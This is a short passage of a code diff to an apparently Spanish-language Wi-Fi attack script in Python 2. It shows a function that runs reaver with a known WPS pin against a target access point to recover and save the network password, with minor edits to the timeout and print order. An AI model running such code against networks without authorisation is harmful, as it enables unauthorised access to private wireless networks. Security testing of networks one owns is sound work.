     Intenta averiguar la contrasenia, una vez que se consiguio el pin WPS
     """
     
-    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',canal,'-p',pin,'-L'], timeout = (REAVER_TIME+4))
+    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',canal,'-p',pin,'-L'], timeout = (REAVER_TIME))
     password = engine.parse_reaver(output, pin_encontrado = True)
     if password == 'no password':
       print
@@ -845,13 +951,14 @@ class Attack():
     else:
       print INFO + "Clave encontrada!"
       print '\t' + INPUT + password.strip()
+      print
     if OUTPUT:
       for_file.append('Password: ' + password + '\n'+'-'*40+'\n')
       c.data_file(for_file)
 
 if __name__ == '__main__':
-  arg_parser()
   banner()
+  arg_parser()
   try:
     c = Config()
     engine = Engine()
